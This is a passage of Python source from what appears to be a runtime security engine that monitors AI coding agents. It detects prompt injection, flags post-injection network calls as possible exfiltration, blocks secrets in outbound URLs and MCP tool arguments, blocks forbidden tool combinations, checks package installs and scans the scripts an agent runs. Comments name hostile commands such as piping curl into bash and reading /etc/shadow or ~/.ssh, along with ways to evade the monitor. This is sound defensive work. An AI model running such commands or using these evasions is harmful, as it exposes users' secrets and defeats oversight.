                        prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                        findings.append({
                            "id": prefixed_id,
                            "severity": "CRITICAL",
                            "category": "prompt_injection",
                            "title": "Prompt injection hidden in HTML structure of fetched page",
                            "evidence": _truncate(_det),
                            "eventIndex": index,
                            "ruleId": "html-injection",
                            "action": "block",
                        })
                except Exception:
                    pass

        # ── Hybrid semantic prompt-injection layer (opt-in) ────────────────
        # Catches paraphrased, social-engineered, and in-content injection
        # that the YAML regex rules miss. Heuristic pre-screen is <1ms; LLM
        # subagent is only invoked on the uncertain zone [low, high). See
        # settings.semantic_guard in default_policy.yaml for tuning.
        # Skipped for synthetic script lines: the guard is LLM-backed, so
        # running it once per line would multiply cost and latency by the
        # length of the script. Script bodies stay on the deterministic path.
        if (
            self.semantic_guard_config.get("enabled")
            and not event.get("_script_line")
            # Set on the CLI subagent: it is a Claude Code session too, so
            # its own hooks would screen the text it was asked to judge.
            and not os.environ.get("PRISMOR_SEMANTIC_SUBAGENT")
        ):
            try:
                sem_finding = self._run_semantic_layer(event, field_values, index, session_id)
                if sem_finding:
                    findings.append(sem_finding)
            except Exception as exc:
                sys.stderr.write(f"[prismor] semantic_guard error: {exc}\n")

        # ── Taint tracking: mark session if injection detected ─────────────
        # If this event produced any prompt_injection findings, persist that
        # fact so subsequent network events can be escalated regardless of
        # their destination.
        # Synthetic script lines never load or mark taint: _get_taint() reads
        # the session's taint file from disk, and doing that once per line of a
        # script is hundreds of needless reads. The originating shell event
        # still marks once, from this same findings list, after the script scan.
        taint = None if event.get("_script_line") else self._get_taint(session_id)
        if taint is not None and any(
            f.get("category") in ("prompt_injection", "prompt_injection_semantic")
            for f in findings
        ):
            taint.mark_injection(index)

        # ── Network event: cloaking-secret check + taint escalation ───────
        if event_type == "network":
            url = field_values.get("url", "")
            if url:
                # Check if any enrolled cloaking secret appears in the URL.
                # This catches exfiltration of any shape of key, not just the
                # well-known patterns in the YAML rule above.
                _secret_name = _check_cloaked_secrets_in_url(url)
                if _secret_name:
                    finding_id = f"cloaked-secret-in-url-{index}"
                    prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                    findings.append({
                        "id": prefixed_id,
                        "severity": "CRITICAL",
                        "category": "secret_exfiltration",
                        "title": (
                            f"Enrolled secret '@@SECRET:{_secret_name}@@' "
                            f"detected in outbound URL"
                        ),
                        "evidence": "[secret value redacted from evidence]",
                        "eventIndex": index,
                        "ruleId": "cloaked-secret-in-url",
                        "action": "block",
                    })

            # MCP / request-body exfiltration: a remote MCP tool call carries
            # its arguments in the request body, not the URL. Scan the serialized
            # arguments for any enrolled cloaking secret so secrets shipped as
            # tool parameters are caught the same way as secrets in a URL.
            outbound_payload = str(event.get("outbound_payload", ""))
            if outbound_payload:
                _secret_in_args = _check_cloaked_secrets_in_text(outbound_payload)
                if _secret_in_args:
                    finding_id = f"cloaked-secret-in-mcp-args-{index}"
                    prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                    findings.append({
                        "id": prefixed_id,
                        "severity": "CRITICAL",
                        "category": "secret_exfiltration",
                        "title": (
                            f"Enrolled secret '@@SECRET:{_secret_in_args}@@' "
                            f"detected in outbound MCP tool arguments"
                        ),
                        "evidence": "[secret value redacted from evidence]",
                        "eventIndex": index,
                        "ruleId": "cloaked-secret-in-mcp-args",
                        "action": "block",
                    })

            if url:
                # If this session previously had a prompt injection finding,
                # any subsequent outbound network call is suspicious — escalate
                # to CRITICAL regardless of destination.
                if taint is None:
                    taint = self._get_taint(session_id)
                if taint is not None and taint.injection_detected:
                    finding_id = f"taint-escalation-{index}"
                    prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                    findings.append({
                        "id": prefixed_id,
                        "severity": "CRITICAL",
                        "category": "secret_exfiltration",
                        "title": (
                            "Outbound network call after prompt injection detected "
                            "— possible response-blind exfiltration"
                        ),
                        "evidence": _truncate(url),
                        "eventIndex": index,
                        "ruleId": "taint-escalation",
                        "action": "block",
                    })

                # Track seen domains so the taint store has context on what
                # domains this session has legitimately contacted.
                if taint is not None:
                    _domain = _extract_domain(url)
                    if _domain:
                        taint.add_domain(_domain)

        # ── Forbidden tool-tag combination (generalized lethal trifecta) ──
        # Tools carry customizable tags; a session may not COMPLETE a forbidden
        # tag set (default: untrusted_content + critical_action). Block the call
        # that completes it, before it executes. Detection lives in trifecta.py
        # (swappable); enforcement is here.
        # Not for synthetic script lines: TagLedger is a persisted, accumulating
        # per-session record, so classifying each line of a script would write
        # the ledger hundreds of times and could complete an incompatible-tag
        # pair (e.g. untrusted_content + critical_action) from unrelated lines
        # of one file. The originating shell event is classified instead.
        if (
            self.tool_tags.get("enabled")
            and session_id
            and self.workspace is not None
            and not event.get("_script_line")
        ):
            try:
                from prismor.runtime.trifecta import (
                    classify_tool_tags, egress_tags, TagLedger, tool_tags_for_agent,
                )
                from prismor.runtime.tag_rules import compile_tool_tag_rules
                _tt_tool = str((event.get("metadata") or {}).get("tool_name") or "")
                # A policy attached to this agent in the control plane rides in
                # the bundle as settings.tool_tags.agents[<name>], the same shape
                # settings.egress.agents uses. Tighten-only — see
                # trifecta.tool_tags_for_agent for why that is not optional.
                _tt_cfg = tool_tags_for_agent(
                    self.tool_tags,
                    str(event.get("agent_name") or event.get("agent") or ""),
                )
                # Destination-derived tags let a tag rule reference where a call
                # is going, not just which tool it is — the egress verdict for
                # THIS event is already in `findings` by the time we get here.
                _extra = (
                    egress_tags(findings)
                    if _tt_cfg.get("egress_tags_enabled", True) else set()
                )
                _tags = classify_tool_tags(
                    event, event_type,
                    {f.get("category") for f in findings},
                    _tt_cfg,
                    extra_tags=_extra,
                )
                if _tags:
                    _rules = compile_tool_tag_rules(_tt_cfg)
                    _ledger = TagLedger(self.workspace, session_id)
                    _done = _ledger.completes_rules(_tags, _rules, index)
                    _tt_mode = self.device_mode or str(_tt_cfg.get("mode", "observe")).lower()
                    if _done is not None and _done.get("action") == "warn":
                        # A warn rule observes but never blocks — even under a
                        # device-level enforce override.
                        _tt_mode = "observe"
                    if _done is not None:
                        _intro = _done.get("introduced_by") or {}
                        _prior = ", ".join(
                            f"{_t} (by '{(_intro.get(_t) or {}).get('tool', '?')}')"
                            for _t in _done["set"] if _t in _intro
                        )
                        # Legacy/default rules keep the historical ruleId; DSL
                        # rules get a stable per-expression id. Both stay floor-
                        # protected via category lethal_trifecta.
                        if _done.get("source") in ("incompatible", "default"):
                            _rid = "tool-category-crossover"
                        else:
                            _rid = f"tag-rule:{_done.get('rule_id', '')}"
                        _steps = _done.get("steps") or [_done["set"]]
                        _combo = " then ".join(
                            "+".join(s) for s in _steps
                        ) if len(_steps) > 1 else ", ".join(_done["set"])
                        _fid = f"{_rid}-{index}"
                        _pfx = f"{session_id}:{_fid}" if session_id else _fid
                        _tt_finding = {
                            "id": _pfx,
                            "severity": "CRITICAL",
                            "category": "lethal_trifecta",
                            "title": (
                                f"Forbidden tool combination: '{_tt_tool}' completes "
                                f"tag sequence [{_combo}] in this session"
                            ),
                            "evidence": (
                                f"call adds tag(s) {_done['this_call_tags']}; "
                                f"prior: {_prior or 'n/a'}"
                                + (f"; rule: {_done['source']}" if _done.get("source") not in ("incompatible", "default") else "")
                            ),
                            "eventIndex": index,
                            "ruleId": _rid,
                            "action": "block",
                            "mode": _tt_mode,
                        }
                        if _done.get("action") == "redact":
                            # `-> redact`: rewrite the completing call rather
                            # than deny it. Category stays lethal_trifecta so
                            # the floor protection applies; the transform is
                            # the data-boundary redactor.
                            _tt_finding["action"] = "modify"
                            _tt_finding["transform"] = "pii_redact"
                            _tt_finding["severity"] = "HIGH"
                            _tt_finding["category"] = "data_boundary"
                        findings.append(_tt_finding)
                    # A blocked call never executes, so its tags must not enter
                    # the ledger: recording them would mark the forbidden set as
                    # already covered and let every later same-tagged call
                    # through (the one-denied-call-poisons-the-ledger bypass).
                    if not (_done is not None and _tt_mode == "enforce"):
                        _ledger.record(_tags, index, _tt_tool)
            except Exception:
                pass

        # Normalize enforcement for code-authored (synthetic) findings: canary /
        # vault / cloaked-secret-exfil / taint / html-injection carry
        # action:"block" but no `mode`. They are intrinsic hard-floor protections
        # and must enforce regardless of default_mode. Rule-derived findings set
        # `mode` above, so setdefault is a no-op for them.
        for _f in findings:
            if "mode" not in _f:
                _f["mode"] = "enforce" if str(_f.get("action")) == "block" else "observe"
        return findings

    def _get_semantic_guard(self):
        """Lazy-instantiate the configured semantic guard. Returns None on failure."""
        if self._semantic_guard is not None:
            return self._semantic_guard if self._semantic_guard is not False else None

        cfg = self.semantic_guard_config or {}
        mode = str(cfg.get("mode", "hybrid")).lower()
        try:
            if mode in ("auto", "hybrid"):
                from prismor.runtime.semantic_guard_v2 import SemanticGuardV2
                cli = cfg.get("cli_path") or None
                # `auto` is the default and screens every tool call, so it never
                # spawns the CLI subagent; `hybrid` is the explicit opt-in to it.
                self._semantic_guard = SemanticGuardV2(
                    cli_path=cli,
                    model=str(cfg.get("model") or ""),
                    allow_cli=(mode == "hybrid"),
                )
            else:
                from prismor.runtime.semantic_guard import SemanticGuard
                self._semantic_guard = SemanticGuard(
                    model=str(cfg.get("model") or ""),
                    force_heuristic=(mode == "heuristic"),
                )
        except Exception as exc:
            sys.stderr.write(f"[prismor] semantic_guard init failed: {exc}\n")
            self._semantic_guard = False
            return None
        return self._semantic_guard

    def _run_semantic_layer(
        self,
        event: Dict[str, Any],
        field_values: Dict[str, str],
        index: int,
        session_id: str,
    ) -> Optional[Dict[str, Any]]:
        """Run the opt-in semantic guard on text fields. Returns one finding or None."""
        guard = self._get_semantic_guard()
        if guard is None:
            return None

        cfg = self.semantic_guard_config
        # _extract_fields joins prompt/response/content/stdout/stderr into
        # combined_text; command is normalized separately. Configurable
        # fields are kept in the YAML for future granularity, but the
        # extractor exposes them merged today.
        parts = [field_values.get("combined_text", ""), field_values.get("command", "")]
        text = "\n".join(p for p in parts if p).strip()
        if len(text) < 12:  # too short to be a meaningful semantic attack
            return None

        result = guard.analyze(text)
        # SemanticGuardV2 returns HybridRisk; v1 returns SemanticRisk directly.
        risk = getattr(result, "final", result)
        score = float(getattr(risk, "risk_score", 0.0))

        warn_t = float(cfg.get("warn_threshold", 0.45))
        block_t = float(cfg.get("block_threshold", 0.75))
        if score < warn_t:
            return None

        action = "block" if score >= block_t else "warn"
        severity = "CRITICAL" if action == "block" else "HIGH"
        category = "prompt_injection_semantic"
        rule_id = "semantic-guard-hybrid" if str(cfg.get("mode", "hybrid")).lower() in ("auto", "hybrid") else "semantic-guard"
        finding_id = f"{rule_id}-{index}"
        prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id

        reason = getattr(risk, "reason", "")
        sem_cat = getattr(risk, "category", "unknown")
        evidence = f"category={sem_cat} score={score:.2f} reason={reason}"

        return {
            "id": prefixed_id,
            "severity": severity,
            "category": category,
            "title": f"Semantic prompt-injection detected ({sem_cat}, score {score:.2f})",
            "evidence": _truncate(evidence),
            "eventIndex": index,
            "ruleId": rule_id,
            "action": action,
            # Same provenance tag the rule findings carry (#155).
            "source": _EVENT_SOURCE.get(str(event.get("type", "")), str(event.get("type", ""))),
        }

    def _score_package(
        self,
        spec: Any,
        ecosystem: str,
        install_event: Any,
        scorer: Any,
        index: int,
        session_id: str,
    ) -> Optional[Dict[str, Any]]:
        """Score one package spec and build a finding dict, or None on an
        "allow" verdict or lookup failure. Shared by the command-line and
        manifest-write supply-chain checks below.
        """
        from supplychain.ecosystems.metadata import fetch_metadata

        try:
            meta = fetch_metadata(spec, ecosystem)
            verdict = scorer.score(spec, meta, install_event)
        except Exception:
            return None
        if verdict.verdict == "allow":
            return None

        has_ioc = any(s.id.startswith("ioc_") for s in verdict.signals)
        severity = (
            "CRITICAL" if has_ioc or verdict.score >= 80
            else "HIGH" if verdict.verdict == "block"
            else "MEDIUM"
        )
        top_signals = "; ".join(
            f"{s.description} (+{s.points})" for s in verdict.signals[:3]
        )
        evidence = f"{spec.raw} [{ecosystem}]"
        if top_signals:
            evidence += f": {top_signals}"

        try:
            from supplychain.scoring.safe_version import recommend_safe_version
            _sv = recommend_safe_version(spec.name, ecosystem, exclude_version=spec.version)
        except Exception:
            _sv = None

        finding_id = f"pkg-install-vulnerable-version-{index}-{spec.name}"
        prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
        return {
            "id": prefixed_id,
            "severity": severity,
            "category": "dependency_risk",
            "title": (
                f"Risky {ecosystem} install: {spec.raw} "
                f"(score {verdict.score}/100, {verdict.verdict})"
            ),
            "evidence": _truncate(evidence),
            "eventIndex": index,
            "ruleId": "pkg-install-vulnerable-version",
            "action": "block" if verdict.verdict == "block" else "warn",
            "safe_version": _sv.version if _sv else None,
            "remediation": f"Use {_sv.version} instead ({_sv.reason})" if _sv else None,
            # Same default as every other dependency_risk rule: no per-rule
            # override exists here, so inherit the device override (if any)
            # or the policy's default_mode, exactly as a YAML rule without an
            # explicit `mode` would.
            "mode": self.device_mode or self.default_mode,
        }

    def _check_execution_targets(
        self,
        command: str,
        index: int,
        session_id: str,
        subject_dict: Optional[Dict[str, Any]] = None,
    ) -> List[Dict[str, Any]]:
        """Evaluate the CONTENT a command would run, not just the command.

        Each recovered line is checked against the same rules as an inline
        command, and through the same contextual verifier, so a rule table or a
        docstring that merely mentions a dangerous command stays inert. Findings
        carry ``execTarget`` (the file:line they came from) and are marked
        ``contextInert`` while ``execution_target_action`` is "observe", which
        keeps them out of every blocking path.
        """
        from prismor.runtime.exec_targets import collect
        from prismor.runtime.shell_context import is_inert_match

        cwd = self.workspace or Path.cwd()
        advisory = self.execution_target_action != "enforce"
        findings: List[Dict[str, Any]] = []
        seen: Set[Tuple[str, str]] = set()

        for line in collect(command, cwd):
            for rule in self.rules:
                if "shell" not in rule.event_types:
                    continue
                match = rule.patterns.search(line.text)
                if match is None:
                    continue
                if self._is_allowlisted(rule.id, line.text):
                    continue
                if is_inert_match(line.text, match.start(), match.end()):
                    continue
                key = (rule.id, line.origin)
                if key in seen:
                    continue
                seen.add(key)

                finding_id = f"{rule.id}-target-{index}-{len(findings)}"
                findings.append({
                    "id": f"{session_id}:{finding_id}" if session_id else finding_id,
                    "severity": rule.severity,
                    "category": rule.category,
                    "title": f"{rule.title} (in {line.origin})",
                    "evidence": _truncate(f"{line.origin}: {line.text}"),
                    "pattern": rule.matched_pattern(line.text),
                    "eventIndex": index,
                    "ruleId": rule.id,
                    "action": "warn" if advisory else rule.action,
                    "transform": rule.transform,
                    "subject": subject_dict,
                    "source": "execution_target",
                    # Where the dangerous content actually lives, so a reviewer
                    # sees the file and line rather than only the invocation.
                    "execTarget": line.origin,
                    # Once promoted to enforce, resolve mode exactly as an
                    # inline finding does -- including the non-overridable
                    # floor -- so a root wipe hidden in a script is treated the
                    # same as one typed at the prompt.
                    "mode": "observe" if advisory else self._resolve_mode(rule),
                    # Advisory findings never block, by the same flag the
                    # inline contextual verifier uses.
                    "contextInert": advisory,
                })
        return findings

    def _check_supply_chain(
        self,
        command: str,
        index: int,
        session_id: str,
    ) -> List[Dict[str, Any]]:
        """Score package installs found in ``command`` via the supplychain
        engine (OSV CVEs, typosquatting, IOC/malicious-package matches,
        registry metadata). Returns one finding per package that isn't a
        clean "allow" verdict. Fails open: any import or lookup error
        yields no findings rather than blocking the command.

        Only catches installs with an explicit package@version on the
        command line. An agent that pins a version by editing the manifest
        directly and then runs a bare `npm install` is caught instead by
        ``_check_manifest_write`` below.
        """
        findings: List[Dict[str, Any]] = []
        try:
            from supplychain.ecosystems.detector import detect_install
            from supplychain.scoring.engine import RiskScorer, load_allowlist
        except Exception:
            return findings

        allowlist = load_allowlist(self.workspace) if self.workspace else set()
        scorer = RiskScorer(allowlist=allowlist)

        checked = 0
        for argv in _iter_install_argvs(command):
            if checked >= _SUPPLY_CHAIN_MAX_PACKAGES_PER_COMMAND:
                break
            try:
                install_event = detect_install(argv)
            except Exception:
                continue
            if install_event is None or not install_event.packages:
                continue

            for spec in install_event.packages:
                if checked >= _SUPPLY_CHAIN_MAX_PACKAGES_PER_COMMAND:
                    break
                checked += 1
                finding = self._score_package(
                    spec, install_event.ecosystem, install_event, scorer, index, session_id
                )
                if finding is not None:
                    findings.append(finding)
        return findings

    def _extract_manifest_pins(self, content: str, ecosystem: str) -> List[Tuple[str, str]]:
        """Return [(name, version), ...] of exact-pinned dependencies for
        `ecosystem` found anywhere in `content`. Range-specified versions
        (^, ~, >=, caret-implied, ...) are skipped — they don't resolve to
        a single OSV-queryable version.
        """
        if ecosystem == "npm":
            return [(m.group(1), m.group(2)) for m in _NPM_MANIFEST_PIN_RE.finditer(content)]
        if ecosystem == "pip":
            return [(m.group(1), m.group(2)) for m in _PIP_MANIFEST_PIN_RE.finditer(content)]
        if ecosystem == "go":
            return [(m.group(1), m.group(2)) for m in _GO_MANIFEST_PIN_RE.finditer(content)]
        if ecosystem == "cargo":
            out: List[Tuple[str, str]] = []
            for m in _CARGO_MANIFEST_PIN_RE.finditer(content):
                name = m.group(1)
                if name in _CARGO_NON_DEP_KEYS:
                    continue
                version = m.group(2) or m.group(3)
                out.append((name, version))
            return out
        return []

    def _check_manifest_write(
        self,
        content: str,
        ecosystem: str,
        index: int,
        session_id: str,
    ) -> List[Dict[str, Any]]:
        """Score exact-pinned dependency versions found in text being
        written to a manifest (covers both a full ``Write`` and an
        ``Edit`` snippet, since pin detection only needs to see the new
        pinned-dependency line, not the whole file).

        Cargo.toml note: a bare `dep = "1.2.3"` is technically a caret
        (^1.2.3) requirement by Cargo's default semantics, not a hard pin
        — we score the written version anyway as a best-effort signal,
        since that's what `cargo add` just wrote and what will resolve
        today.
        """
        findings: List[Dict[str, Any]] = []
        pins = self._extract_manifest_pins(content, ecosystem)
        if not pins:
            return findings
        try:
            from supplychain.ecosystems.detector import InstallEvent, PackageSpec
            from supplychain.scoring.engine import RiskScorer, load_allowlist
        except Exception:
            return findings

        allowlist = load_allowlist(self.workspace) if self.workspace else set()
        scorer = RiskScorer(allowlist=allowlist)
        install_event = InstallEvent(ecosystem=ecosystem, argv=[], packages=[])

        checked = 0
        seen: set = set()
        for name, version in pins:
            if checked >= _SUPPLY_CHAIN_MAX_PACKAGES_PER_COMMAND:
                break
            if name in seen:
                continue
            seen.add(name)
            checked += 1
            spec = PackageSpec(raw=f"{name}@{version}", name=name, source="registry", version=version)
            finding = self._score_package(spec, ecosystem, install_event, scorer, index, session_id)
            if finding is not None:
                findings.append(finding)
        return findings

    def _check_transitive_postinstall(self, index: int, session_id: str) -> List[Dict[str, Any]]:
        """Scan the FULL resolved npm dependency tree (including
        transitive sub-dependencies a direct command/manifest check never
        sees) against OSV once an install has completed.

        Detective, not preventive: the tree only exists after `npm
        install` has already run, so this only ever produces a `warn`
        finding with `mode: observe` — never `block`. Only reports names
        that AREN'T already top-level/direct (those are covered by the
        pre-action checks above); this is purely the additive,
        transitive-only signal.
        """
        findings: List[Dict[str, Any]] = []
        if self.workspace is None:
            return findings
        try:
            from prismor.runtime.deps import _read_npm_lockfile, read_js_lockfiles_full
            from supplychain.scoring.osv_lookup import fetch_vulns_batch
        except Exception:
            return findings

        full_tree = read_js_lockfiles_full(self.workspace)
        if not full_tree:
            return findings
        top_level = _read_npm_lockfile(self.workspace)
        transitive_only = {n: v for n, v in full_tree.items() if n not in top_level}
        if not transitive_only:
            return findings

        items = sorted(transitive_only.items())
        truncated = len(items) > _TRANSITIVE_SCAN_MAX_PACKAGES
        if truncated:
            items = items[:_TRANSITIVE_SCAN_MAX_PACKAGES]

        try:
            results = fetch_vulns_batch([(name, "npm", version) for name, version in items])
        except Exception:
            return findings

        flagged = [
            (name, version, vulns)
            for (name, _eco, version), vulns in results.items()
            if vulns
        ]
        if not flagged:
            return findings

        flagged.sort(
            key=lambda f: max((_SEVERITY_RANK.get(v["severity"], 0) for v in f[2]), default=0),
            reverse=True,
        )
        has_ioc = any(v.get("malicious") for _n, _v, vs in flagged for v in vs)
        top_severity = max(
            (v["severity"] for _n, _v, vs in flagged for v in vs),
            key=lambda s: _SEVERITY_RANK.get(s, 0),
            default="medium",
        )
        severity = "CRITICAL" if has_ioc else top_severity.upper()

        summary = "; ".join(f"{n}@{v} ({vs[0]['id']})" for n, v, vs in flagged[:5])
        if len(flagged) > 5:
            summary += f"; +{len(flagged) - 5} more"
        if truncated:
            summary += (
                f" [scan capped at {_TRANSITIVE_SCAN_MAX_PACKAGES} of "
                f"{len(transitive_only)} transitive packages]"
            )

        finding_id = f"transitive-dependency-vulnerable-{index}"
        prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
        findings.append({
            "id": prefixed_id,
            "severity": severity,
            "category": "dependency_risk",
            "title": (
                f"{len(flagged)} transitive npm "
                f"dependenc{'y' if len(flagged) == 1 else 'ies'} with known vulnerabilities"
            ),
            "evidence": _truncate(summary, max_length=400),
            "eventIndex": index,
            "ruleId": "transitive-dependency-vulnerable",
            "action": "warn",
            # Always observe, never enforce — this finding describes a
            # tree that has already been installed; should_block() only
            # acts on pre-action events, but mode is set explicitly here
            # too so the intent reads correctly from the finding alone.
            "mode": "observe",
        })
        return findings

    def _resolve_script_in_workspace(
        self, raw_path: str, bases: Optional[List[str]] = None
    ) -> Optional[Path]:
        """Resolve a script path referenced by a shell command to a real file
        that lives *inside* the workspace. Returns None otherwise.

        A relative path is tried against the workspace root first, then against
        any directory the command cds into (``cd build && bash run.sh``).

        Containment is the security boundary and applies to every candidate:
        the real (symlink-resolved) path must sit under the real workspace root.
        This is deliberately strict — it stops the inspector from being coerced
        into reading files outside the project (`bash /etc/shadow`, a `./x.sh`
        symlink pointing at ~/.ssh) and surfacing their contents in a finding.
        Out-of-workspace droppers (`/tmp/x`) are already covered by the
        fetch-then-execute rule.
        """
        if self.workspace is None or not raw_path:
            return None
        try:
            ws_real = Path(os.path.realpath(str(self.workspace)))
        except (OSError, ValueError):
            return None

        candidates: List[Path] = []
        cand = Path(raw_path)
        if cand.is_absolute():
            candidates.append(cand)
        else:
            candidates.append(Path(self.workspace) / raw_path)
            for base in bases or []:
                # A cd target is itself untrusted text; containment below is
                # what makes trying it safe.
                candidates.append(Path(self.workspace) / base / raw_path)

        for c in candidates:
            try:
                real = Path(os.path.realpath(str(c)))
                # Containment check (relative_to raises when outside).
                real.relative_to(ws_real)
                if real.is_file():
                    return real
            except (OSError, ValueError):
                continue
        return None

    def _scan_invoked_script_contents(
        self,
        event: Dict[str, Any],
        command: str,
        index: int,
        session_id: str,
        subject: Optional[Any],
        depth: int = 0,
        seen: Optional[set] = None,
    ) -> List[Dict[str, Any]]:
        """For each local script a shell command runs, evaluate the script's
        body **line by line as synthetic shell events**.

        The security principle is equivalence: a line inside a script the agent
        is about to run gets judged by exactly the same standard as the same
        text typed at the command line. That reuses the shell rule set as-is —
        which is already tuned against real command lines, so it inherits its
        false-positive profile rather than inventing a new one — and it closes
        the indirect bypass where `bash ./x.sh` hides `curl … | bash`.

        Per-line (not whole-body) matters: the shell patterns are written with
        ``[^\\n]`` single-line semantics, and evaluating a whole body at once
        would let unrelated lines match as if adjacent.

        Fail-open throughout: a script that can't be resolved or read is
        skipped, never raised.
        """
        findings: List[Dict[str, Any]] = []
        # Shared across the whole invocation tree: bounds total work and makes
        # a mutual-recursion cycle (a.sh -> b.sh -> a.sh) terminate.
        if seen is None:
            seen = set()
        cd_bases = _extract_cd_targets(command)
        for n, raw_path in enumerate(_extract_invoked_scripts(command)):
            real = self._resolve_script_in_workspace(raw_path, cd_bases)
            if real is None:
                continue
            key = str(real)
            if key in seen or len(seen) >= _MAX_TOTAL_SCRIPTS:
                continue
            seen.add(key)
            try:
                # Bounded read — never load the whole file just to slice it.
                # One byte over the cap tells us the file was longer without
                # holding the rest of it.
                with open(real, "rb") as fh:
                    raw_bytes = fh.read(_MAX_SCRIPT_BYTES + 1)
            except OSError:
                continue
            size_truncated = len(raw_bytes) > _MAX_SCRIPT_BYTES
            body = raw_bytes[:_MAX_SCRIPT_BYTES].decode("utf-8", "replace")
            if not body.strip():
                continue

            try:
                # Relative to the *resolved* root — `real` is already
                # symlink-resolved, so relpath against the raw workspace would
                # leak `../` noise on platforms where the root is itself a
                # symlink (e.g. macOS /var → /private/var).
                rel = os.path.relpath(str(real), os.path.realpath(str(self.workspace)))
            except ValueError:
                rel = str(real)

            # One finding per rule per script: a loop that repeats a risky line
            # shouldn't produce fifty identical findings.
            seen_rules: set[str] = set()
            lines, line_truncated = _executable_lines(body)

            # Silently stopping inspection is exactly what padding a script
            # counts on, so say so out loud. Warn-level: not knowing is not
            # itself proof of malice, but it must never look like a clean scan.
            if size_truncated or line_truncated:
                limit = (f"first {_MAX_SCRIPT_BYTES // 1024} KB"
                         if size_truncated else f"first {_MAX_SCRIPT_LINES} statements")
                finding_id = f"script-not-fully-inspected-{index}"
                prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                findings.append({
                    "id": f"{prefixed_id}~s{n}",
                    "severity": "LOW",
                    # Deliberately its own category, outside the policy's
                    # block_categories: incomplete coverage is a reporting
                    # signal, never grounds to fail a build. Omitting `mode`
                    # leaves it observe-only, so should_block() ignores it —
                    # same convention as the other code-authored warnings.
                    "category": "inspection_coverage",
                    "title": f"Executed script too large to inspect fully: {rel}",
                    "evidence": _truncate(
                        f"[{rel}] only the {limit} were scanned; the rest of the "
                        f"script was not checked"
                    ),
                    "eventIndex": index,
                    "ruleId": "script-not-fully-inspected",
                    "action": "warn",
                    "subject": subject.as_dict() if subject is not None else None,
                    "source": _SCRIPT_SOURCE,
                    "viaScript": rel,
                })

            for lineno, line in lines:
                synthetic = {
                    "type": "shell",
                    "command": line,
                    # Preserve the originating phase so should_block() gates on
                    # the real event's pre/post action state.
                    "agent_event": event.get("agent_event", ""),
                    # Marks this as a synthetic script line: suppresses the
                    # stateful / network-backed side checks that must not run
                    # once per line, and bounds how far nested `bash b.sh`
                    # invocations are followed.
                    "_script_line": True,
                    "_script_depth": depth + 1,
                    "_script_seen": seen,
                }
                for f in self.evaluate(synthetic, index, session_id, subject):
                    rule_id = str(f.get("ruleId", ""))
                    if rule_id in seen_rules:
                        continue
                    seen_rules.add(rule_id)
                    # Provenance: the match is in a script the command runs,
                    # not in the command text itself. A finding bubbling up
                    # from a nested script already carries its own (deeper)
                    # location — don't overwrite it with this level's.
                    if not f.get("viaScript"):
                        f["viaScript"] = rel
                        f["viaScriptLine"] = lineno
                        f["source"] = _SCRIPT_SOURCE
                        f["evidence"] = f"[{rel}:{lineno}] {f.get('evidence', '')}"
                        # Disambiguate ids when one command runs several
                        # scripts that trip the same rule (evaluate keys ids
                        # off `index`).
                        f["id"] = f"{f['id']}~s{n}"
                    findings.append(f)
        return findings

    def check_command(self, command: str) -> List[Dict[str, Any]]:
        """Quick check: evaluate a shell command string. Returns findings."""
        event = {"type": "shell", "command": command}
        return self.evaluate(event, 0)

    def check_path(self, path: str, event_type: str = "file_read") -> List[Dict[str, Any]]:
        """Quick check: evaluate a file path. Returns findings."""
        event = {"type": event_type, "path": path}
        return self.evaluate(event, 0)

    def check_text(self, text: str) -> List[Dict[str, Any]]:
        """Quick check: evaluate arbitrary text (e.g. agent output) for
        PII / model-manipulation content. Returns findings."""
        event = {"type": "text", "content": text}
        return self.evaluate(event, 0)

    def _is_allowlisted(self, rule_id: str, evidence: str) -> bool:
        # Vetoes are resolved first and unconditionally: a veto that matches
        # means no allowlist may suppress this finding, whatever order the
        # entries appear in the merged policy. Without the two passes a
        # carve-out would silently depend on file ordering, and a later
        # project-level allowlist could out-rank an org-level veto.
        for entry in self.allowlists:
            if entry.type == "veto" and entry.applies_to(rule_id) and entry.patterns.search(evidence):
                return False
        for entry in self.allowlists:
            if entry.type == "allow" and entry.applies_to(rule_id) and entry.patterns.search(evidence):
                return True
        return False

    @property
    def egress_allowlist(self) -> List[str]:
        """The flat legacy allowlist (``settings.egress_allowlist``).

        Kept as a property because assigning it after construction is a
        supported way to configure an engine — ``scanner.py`` reads it, and
        callers/tests set it directly. Since the real screening now runs off the
        compiled :attr:`egress` policy, the setter has to rebuild that policy or
        a direct assignment would silently do nothing.
        """
        return self._egress_allowlist

    @egress_allowlist.setter
    def egress_allowlist(self, value: Any) -> None:
        self._egress_allowlist = list(value or [])
        # Only synthesize from the flat list when there is no richer policy to
        # clobber: a real settings.egress always wins over the legacy list.
        current = getattr(self, "egress", None)
        if current is None or current.legacy or not current.enabled:
            self.egress = EgressPolicy.from_settings(
                {"egress_allowlist": self._egress_allowlist},
                source=getattr(self, "_egress_source", "default"),
            )

    def _is_domain_allowed(self, domain: str) -> bool:
        """Check if a domain matches any entry in the egress allowlist.

        Supports exact match and wildcard subdomains (e.g. "*.github.com"
        matches "api.github.com" and "raw.github.com").
        """
        domain_lower = domain.lower()
        for pattern in self.egress_allowlist:
            pattern_lower = pattern.lower()
            if pattern_lower.startswith("*."):
                # Wildcard: *.example.com matches example.com and sub.example.com
                suffix = pattern_lower[2:]
                if domain_lower == suffix or domain_lower.endswith("." + suffix):
                    return True
            else:
                if domain_lower == pattern_lower:
                    return True
        return False

    def _get_taint(self, session_id: str) -> Optional[Any]:
        """Return the taint store for this session, or None if unavailable.

        A caller-supplied ``taint_override`` wins outright: it means this
        evaluation has no local session file to read (hosted channel), so
        falling back to the disk store would silently lose the taint.
        """
        if self.taint_override is not None:
            return self.taint_override
        if not session_id or self.workspace is None:
            return None
        try:
            return _TaintStore(self.workspace, session_id)
        except Exception:
            return None


# ── Shared helpers ──────────────────────────────────────────────────────────

# Unicode scripts we treat as "latin-like" — mixing ASCII filenames with chars
# from other scripts (Cyrillic, Greek, Armenian, etc.) is a classic homoglyph
# attack vector. The check is conservative: it only fires on paths/commands
# that contain both ASCII letters AND non-ASCII-letter characters that look
# confusingly like ASCII letters.
